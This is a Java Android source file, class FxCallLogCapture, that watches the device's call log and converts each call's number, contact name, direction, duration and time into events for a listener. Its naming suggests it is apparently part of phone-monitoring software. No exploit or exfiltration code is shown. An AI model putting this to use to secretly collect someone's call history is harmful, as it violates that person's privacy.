package com.vvt.processcalllog;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.calllog.CallLogData;
import com.vvt.calllog.CallLogObserver;
import com.vvt.calllog.Customization;
import com.vvt.events.FxCallLogEvent;
import com.vvt.events.FxEventDirection;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.FxOperationNotAllowedException;
import com.vvt.logger.FxLog;
import com.vvt.telephony.TelephonyUtils;

public class FxCallLogCapture implements CallLogObserver.OnCaptureListener {
	
	private static final String TAG = "CallLogCapturer";
	private static final boolean LOGV = Customization.VERBOSE;
	public static final String DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	
	private CallLogObserver mCalllogObserver;
	private Context mContext;
	private String mWritablepath;
	private FxEventListener mFxEventListner;
	private boolean mIsWorking;
	
	public FxCallLogCapture(Context context, String writablePath) {
		mContext = context;
		mWritablepath = writablePath;
		
	}
	
	public void register(FxEventListener eventListner) {
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		this.mFxEventListner = eventListner;
		
		if(LOGV) FxLog.v(TAG, "register # EXIT ...");
	}
	
	public void unregister() throws FxOperationNotAllowedException {
		if(LOGV) FxLog.v(TAG, "unregister # ENTER ...");
		if(!mIsWorking) {
			//set the eventhandler to null to avoid memory leaks
			mFxEventListner = null;
		} else {
			throw new FxOperationNotAllowedException("Capturing is working, please call stopCapture before unregister.");
		}
		
		if(LOGV) FxLog.v(TAG, "unregister # EXIT ...");
	}
	
	public void startCapture() throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "startObserver # ENTER ...");
		if(mFxEventListner == null)
			throw new FxNullNotAllowedException("eventListner can not be null");
		
		if(mContext == null)
			throw new FxNullNotAllowedException("Context context can not be null");
		
		if(mWritablepath == null || mWritablepath == "")
			throw new FxNullNotAllowedException("Writablepath context can not be null or empty");
		
		if (!mIsWorking) {
			mIsWorking = true;
			
			mCalllogObserver = CallLogObserver.getInstance(mContext);
			mCalllogObserver.setLoggablePath(mWritablepath);
			//TODO : no need because we deliver time in long type not String.
			mCalllogObserver.setDateFormat(DATE_FORMAT);
			mCalllogObserver.registerObserver(this);
		}
		
		if(LOGV) FxLog.v(TAG, "startObserver # EXIT ...");
	}
	
	public void stopCapture() {
		if(mCalllogObserver != null) {
			mCalllogObserver.unregisterObserver(this);
			mIsWorking = false;
		}
	}

	@Override
	public void onCapture(ArrayList<CallLogData> calls) {
		
		List<FxEvent> events = new ArrayList<FxEvent>();
		FxCallLogEvent event = null;
		
		for (CallLogData call : calls) {
			
			CallLogData.Direction calldir = call.getDirection();
			FxEventDirection direction = calldir == CallLogData.Direction.IN ? 
					FxEventDirection.IN : calldir == CallLogData.Direction.OUT ? 
							FxEventDirection.OUT : calldir == CallLogData.Direction.MISSED ? 
									FxEventDirection.MISSED_CALL : FxEventDirection.UNKNOWN;
			
			String phoneNumber = 
				TelephonyUtils.formatCapturedPhoneNumber(
							call.getPhonenumber());
			
			String contactName = call.getContactName();
			if (contactName == null || contactName.trim().length() < 1) {
				contactName = "unknown";
			}
			
			event = new FxCallLogEvent();
			event.setContactName(contactName);
			event.setDirection(direction);
			event.setDuration(call.getDuration());
			event.setNumber(phoneNumber);
			event.setEventTime(call.getTime());
			
			if(LOGV) FxLog.v(TAG, "event : "+ event.toString());
			
			events.add(event);
		}
		
		this.mFxEventListner.onEventCaptured(events); 
	}
	
}
